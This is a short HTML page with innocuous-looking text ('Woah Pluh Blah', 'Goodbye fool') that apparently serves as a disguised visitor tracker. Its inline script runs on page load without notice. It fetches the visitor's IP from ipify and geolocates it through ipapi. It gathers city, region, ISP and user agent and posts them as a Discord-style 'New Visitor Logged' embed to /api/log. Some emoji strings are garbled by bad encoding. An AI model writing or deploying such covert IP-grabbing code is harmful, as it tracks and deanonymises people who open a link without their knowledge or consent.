<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Some Simple Coding</title>
  <link rel="stylesheet" href="/style.css">
</head>
<body>
  <div class="card">
    <h1>Woah Pluh Blah</h1>
    <p>Goodbye fool</p>
  </div>

  <script>
  async function getIPInfo() {
    try {
      const ipRes = await fetch("https://api.ipify.org?format=json");
      const ipData = await ipRes.json();
      const ip = ipData.ip;

      const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
      const geo = await geoRes.json();

      const country = geo.country_name;
      const countryCode = geo.country_code;
      const city = geo.city || "Unknown";
      const region = geo.region || "Unknown";
      const isp = geo.org || geo.org_name || "Unknown";
      const flag = countryCode ? `:flag_${countryCode.toLowerCase()}:` : "üè≥Ô∏è";
      const userAgent = navigator.userAgent;
      const timestamp = new Date().toLocaleString();

      const embed = {
        title: "üåê New Visitor Logged",
        color: 3447003,
        fields: [
          { name: "IP Address", value: `\`${ip}\``, inline: false },
          { name: "Country", value: `${flag} ${country}`, inline: true },
          { name: "Region", value: region, inline: true },
          { name: "City", value: city, inline: true },
          { name: "ISP", value: isp, inline: false },
          { name: "User Agent", value: `\`${userAgent}\``, inline: false },
          { name: "Time", value: timestamp, inline: false }
        ]
      };

      await fetch("/api/log", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: "Logger Bot",
          embeds: [embed]
        })
      });
    } catch (err) {
      console.error("Logging failed:", err);
    }
  }

  getIPInfo();
    </script>
</body>
</html>
